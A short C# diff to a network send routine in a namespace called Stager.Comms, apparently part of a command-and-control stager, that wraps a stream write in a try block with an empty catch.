@@ -98,7 +98,12 @@ namespace Stager.Comms
             }
 
             var dataToSend = Utilities.SerialiseData(outbound);
-            stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
+
+            try
+            {
+                stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
+            }
+            catch { }
         }
 
         private void WriteCallback(IAsyncResult ar)
